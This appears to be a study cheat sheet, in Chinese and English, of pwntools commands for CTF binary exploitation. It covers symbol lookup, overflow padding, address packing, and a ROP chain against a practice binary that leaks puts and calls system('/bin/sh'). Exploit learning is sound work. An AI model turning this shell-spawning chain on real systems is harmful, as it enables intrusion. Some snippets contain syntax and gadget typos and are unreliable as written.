# 一些有用的命令：

１．　nm -D ./binary_app  # view func address
# nm命令被用于显示二进制目标文件的符号表。简要信息
２．objdump -D ./binary_app　
# 查看函数地址的详细信息
３．log.info("libc is at %#x", l.address) # 格式化一个hex字符串


# generate a template file to start with
pwn template ./syscall_interface --host localhost --port 1234 >exploit.py
python2 exploit.py LOCAL DEBUG # debug 模式下交互

print  io.recvuntil("text:")		# recvuntil spefic string
print  io.recvline(False)
# recvline until a new line, if False given, ignore new line


io.send("test\n")  		# just send will do
io.sendline("test")		# send line and hit enter
io.sendline(136*"A" + some_address['like: \x86\x70...'])

# 在　test 之前随机写入１６个字符，也可以指定填充的字符
fit({16:"test", 32:"TEST2"}，filler="A")

p64(0xdeadbeef)		# '\xef\xbe\xad\xde\x00\x00\x00\x00'
# packing address or strings
# 使用 p32() 就行, p64() 后面全是补0

u64(p64(0xdeadbeef)) 	# 3735928559
# unpacking a string to

以上合在一起用就是:
io.sendline(fit({136:p64(addr)}))

# **************** 下面是一个完整的例子 ＲＯＰ　***********************
from pwn import *

"""
# ROP (Return Oriented Programming)
# 面向返回的编程, 调到特定的地址，设置一个栈，执行其他的函数

"""

exe = context.binary = ELF('./testvuln')
r = ROP(exe)
r.gadgets   		# 打印所有的小组件

# 找到特定的某个组件 然后设置一个栈
g = r.find_gadget(["pop rei", "ret"])

g.address   		# 查看地址

fit(136:g.address)
# or use flat(g.address, 0xdeadbeef)　!!!!!!

r.raw(g.address)		# 这里的raw 就是添加的意思 加上
#　http://docs.pwntools.com/en/stable/rop/rop.html?highlight=raw
r.raw(0xdeadbeef)
# r.raw()  也等价于　fit({136:r.chain()})

print r.dump()  # 查看插入后的结果　　　
# or print str(r)


# 简洁的用法是　使用　call()
r = ROP(exe)
r.call(exe.sym.puts, [exe.got.puts])
r.call(exe.sym.main)		# sym, symbols
print r.dump()


#　如果添加栈成功后，下面可以执行:
r = ROP()
system = l.sym.system	# l = ELF('./xxxx')
binsh = next(l.search("/bin/sh"))
r.call(system, [binsh])
io.sendline(fit({136:r.chain()}))
